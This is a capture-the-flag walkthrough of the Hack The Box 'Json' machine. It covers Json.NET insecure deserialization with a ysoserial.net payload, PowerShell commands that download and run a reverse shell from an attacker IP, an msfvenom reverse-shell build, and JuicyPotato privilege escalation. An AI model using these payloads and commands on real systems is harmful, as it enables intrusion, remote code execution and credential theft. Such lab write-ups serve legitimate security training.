## JSON

https://app.hackthebox.com/machines/Json

### User Flag
`POST /api/token` is the login request. If we remove the JSON on body we receive this error:
```
{"Message":"An error has occurred.","ExceptionMessage":"Object reference not set to an instance of an object.","ExceptionType":"System.NullReferenceException","StackTrace":"   at DemoAppExplanaiton.Controllers.AccountController.Login(Usuario login) in C:\\Users\\admin\\source\\repos\\DemoAppExplanaiton\\DemoAppExplanaiton\\Controllers\\AccountController.cs:line 24\r\n   at lambda_method(Closure , Object , Object[] )\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ActionExecutor.<>c__DisplayClass6_2.<GetExecutor>b__2(Object instance, Object[] methodParameters)\r\n   at System.Web.Http.Controllers.ReflectedHttpActionDescriptor.ExecuteAsync(HttpControllerContext controllerContext, IDictionary`2 arguments, CancellationToken cancellationToken)\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ApiControllerActionInvoker.<InvokeActionAsyncCore>d__1.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Controllers.ActionFilterResult.<ExecuteAsync>d__5.MoveNext()\r\n--- End of stack trace from previous location where exception was thrown ---\r\n   at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()\r\n   at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)\r\n   at System.Web.Http.Dispatcher.HttpControllerDispatcher.<SendAsync>d__15.MoveNext()"}
```

Credentials admin:admin works on login.

Looking through requests, /api/Account catches our eye. We have oauth cookie and Bearer that has the same value.
```
eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=

{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
```

If we change this to an invalid base64 format and put on bearer, we receive this error:
```
{"Message":"An error has occurred.","ExceptionMessage":"Cannot deserialize Json.Net Object","ExceptionType":"System.Exception","StackTrace":null}
```

<br>

💡 One of the primary signs for insecure deserialization is having a serialized object encoded in base64 and put into a cookie.   When the Cookie goes back to the application, it deserializes it and executes its content. There no security/safety controls for checking the UNTRUSTED data.

<br>

Now that we know that the website is using Json.net, we can use [ysoserial.net](https://github.com/pwntester/ysoserial.net).  
This tool works best on a Windows Machines.

Creating a payload to ping us.
```
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "ping -c 10.10.14.5" -t

{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping -c 10.10.14.5']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

Encode the output to base64 and replace the "Bearer" header.

We can use this to get the reverse shell, but encoded in base64 since it uses ''
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"

# For some reason we need to convert to UTF-16
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Replace the previous output with this command
powershell -EncodedCommand SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNC41L0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScp

# You could use two steps reverse
powershell -c Invoke-WebRequest -Uri http://10.2.117.185:8000/shell.exe -OutFile C:\tmp\reverse.ps1
powershell C:\tmp\reverse.ps1
```

<br>

### Privilege Escalation
SeImpersonatePrivilege is enabled, so we can use JuicyPotato.

```
powershell.exe -command iwr -Uri http://10.10.14.5/JuicyPotato.exe -OutFile JuicyPotato.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -a x64 --platform Windows -f exe -o shell.exe

powershell.exe -command iwr -Uri http://10.10.14.5/shell.exe -OutFile shell.exe

.\JuicyPotato.exe -t * -p .\shell.exe -l 4000 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

<br>

We can use this to print the decrypted password from SyncLocation.exe.
```C#
use System.Windows.Forms;

...
private static void Main()
{
	[PUT DECRYPTION CODE]
	MessageBox.Show(userName + ":" + password);
	...
}

